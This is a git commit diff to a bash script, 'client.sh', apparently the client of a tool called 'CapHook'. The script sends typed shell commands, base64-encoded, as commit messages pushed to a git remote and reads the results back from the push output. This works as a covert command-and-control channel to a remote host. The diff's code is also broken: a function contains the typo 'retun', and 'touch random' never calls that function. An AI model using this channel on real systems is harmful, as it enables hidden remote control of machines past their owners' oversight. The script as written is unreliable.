94235af6c779d14b771bd04b93a068068ba02a51
Emmanuel <aadewale123@gmail.com>
2019-09-17 21:15:06 -0400

    bHMK

--- client.sh
+++ client.sh
@@ -1,13 +1,16 @@
 #!/bin/bash
 
+random(){
+    retun cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w ${1:-32} | head -n 1
+}
+
 while true; do
     echo "CapHook> "
     read command
     encode=$(echo ${command} | base64)
     echo ${encode}
-    touch $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w ${1:-15} | head -n 1)
+    touch random
     git add .
     git commit -m ${encode}
-    git push
-    #TODO: Parse results
+    git push | grep "remote: " | awk '{print $2}'
 done
